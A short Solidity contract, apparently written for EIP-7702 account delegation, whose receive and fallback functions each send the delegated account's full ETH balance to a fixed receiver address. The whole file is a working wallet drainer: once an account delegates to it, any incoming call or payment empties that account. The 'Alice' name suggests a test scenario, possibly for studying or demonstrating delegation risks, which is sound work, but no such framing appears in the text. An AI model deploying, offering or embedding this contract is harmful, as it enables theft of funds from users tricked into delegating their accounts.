// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Alice7702FallbackDrain {
    event FallbackDrained(address indexed caller, address indexed receiver, uint256 amount);

    address payable public immutable receiver;

    constructor(address payable receiver_) {
        receiver = receiver_;
    }

    receive() external payable {
        _drain();
    }

    fallback() external payable {
        _drain();
    }

    function _drain() internal {
        uint256 amount = address(this).balance;
        require(amount > 0, "empty delegated balance");

        (bool ok,) = receiver.call{value: amount}("");
        require(ok, "drain failed");

        emit FallbackDrained(msg.sender, receiver, amount);
    }
}
